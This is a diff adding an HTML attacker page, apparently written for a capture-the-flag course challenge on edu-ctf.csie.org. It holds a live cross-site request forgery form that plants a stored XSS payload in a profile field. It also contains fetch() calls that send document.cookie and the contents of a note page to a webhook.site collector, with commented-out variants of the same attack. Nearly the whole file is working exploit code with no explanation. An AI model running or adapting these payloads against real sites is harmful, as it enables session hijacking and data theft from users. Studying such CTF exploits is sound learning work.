@@ -1,0 +1,39 @@
+<!-- <form id="f1" method="POST" action="https://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8">
+    <input type="text" name="foo" value="bar">
+</form>
+<script>
+    document.getElementById("f1").submit()
+    // document.getElementById("f2").submit()
+    // document.getElementById("f3").submit()
+    // document.getElementById("f4").submit()
+</script> -->
+
+<!-- http://hahaha"/> <script>fetch(`http://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8?${document.cookie}`);</script>
+ -->
+<form id="f2" method="POST" action="http://edu-ctf.csie.org:30011/me">
+    <input type="text" name="intro"
+        value="http://hahaha&quot;/&gt; &lt;script&gt;fetch(`http://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8?${document.cookie}`);&lt;/script&gt;">
+</form>
+<script>
+    fetch(`http://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8?${document.cookie}`).then(() => {
+        document.getElementById("f2").submit()
+    })
+</script>
+
+
+<!-- <img src="http://edu-ctf.csie.org:30010/note/9msB9bJB4WEJg0uV0JkseQ" /> -->
+
+
+<!-- <script>
+    fetch('http://edu-ctf.csie.org:30010/note/9msB9bJB4WEJg0uV0JkseQ').then((response) => {
+        return response.text()
+    }).then((textResponse) => {
+        // textResponse = textResponse.slice(200)
+        fetch(`http://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8?res=${textResponse}`, {
+            method: 'POST',
+            body: textResponse
+        });
+
+    })
+
+</script> -->
